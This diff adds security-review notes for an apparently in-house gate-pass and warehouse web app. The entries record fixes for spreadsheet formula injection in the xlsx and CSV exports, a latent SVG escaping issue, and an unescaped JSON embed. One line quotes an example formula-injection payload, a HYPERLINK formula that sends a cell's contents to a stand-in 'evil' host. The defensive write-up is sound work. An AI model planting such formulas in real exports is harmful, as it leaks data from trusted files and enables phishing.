@@ -4073,4 +4073,25 @@ Questions that need Mukesh are marked **Decide:**.
   popups), printed documents (/challan/.../print, gate-pass print, pallet
   sheet - server-rendered Jinja, autoescaped, but worth confirming), and
   the Excel/CSV exports (formula injection - a cell starting with `=`).
+- **Spreadsheet formula injection in every export - SECURITY, fixed.**
+  openpyxl stores ANY string starting with `=` as a formula, and the Export
+  button's `/api/export/xlsx` wrote the screen's text as-is - so a gate
+  pass's party typed as `=HYPERLINK("http://evil/?"&A1,"click")` became a
+  live formula in the workbook of whoever exported the list (the classic
+  way to leak neighbouring cells or phish from inside a trusted file).
+  `.xlsx`: such cells are now stored as text - they show exactly what was
+  typed, nothing added. `.csv` (the server's `/export/<what>.csv` and a
+  table's own CSV export in `icon_table.js`): text opening with = + - @ or
+  tab/CR gets OWASP's leading apostrophe, since Excel evaluates those when
+  it opens a CSV; real numbers (-5, +3.2) are untouched.
+  `test_export_formulas.py` (3) covers all three paths.
+- **Latent: the text line under a Code128 barcode went into SVG raw**, and
+  the pallet sheet embeds that SVG with `|safe`. Only system-generated
+  serials reach it today, so not exploitable - escaped anyway
+  (`test_box_number.py` +1).
+- **Noted, not changed:** `frag_indent_form.html` and `indent_new.html`
+  embed `model_json` with `|safe` inside a `<script>`. It comes from the
+  item catalog in code, so it is safe today - but `json.dumps` does not
+  escape `</script>`, so if the item master ever becomes editable from the
+  screen, that embed must escape `<` (e.g. `.replace("<", "\u003c")`).
 
